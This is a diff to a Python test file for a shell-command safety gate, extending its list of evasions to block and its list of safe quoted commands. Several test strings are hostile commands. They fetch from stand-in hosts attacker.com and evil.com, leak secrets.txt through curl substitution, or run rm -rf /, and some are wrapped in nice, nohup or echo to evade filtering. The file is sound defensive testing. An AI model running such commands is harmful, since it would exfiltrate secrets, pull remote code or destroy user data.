@@ -203,9 +203,12 @@ def test_safety_gate_catches_command_evasions(
         "env FOO=bar curl http://attacker.com/malware",
         "sudo -u root rm -rf /",
         "nohup rm -Rf /",
+        "nice -n 10 curl http://attacker.com",
         "xargs -I {} curl {}",
         "curl $(cat secrets.txt)",
         "curl `cat secrets.txt`",
+        'echo "$(curl http://evil.com)"',
+        'echo "`curl http://evil.com`"',
     ]
 
     for cmd in evasion_commands:
@@ -230,12 +233,13 @@ def test_safety_gate_permits_safe_quoted_and_argument_commands(
     safe_commands = [
         'git commit -m "Refactor logic; fix bugs"',
         'echo "<html>"',
-        'echo "Use `backticks` in markdown"',
-        'git commit -m "Fix $(VAR)"',
+        "echo 'Use `backticks` in markdown'",
+        "git commit -m 'Fix $(VAR)'",
         "cat curl",
         "git add rm",
         "rm --interactive file.txt",
         "rm --dir my_folder",
+        "rm --preserve-root file.txt",
     ]
 
     for cmd in safe_commands:
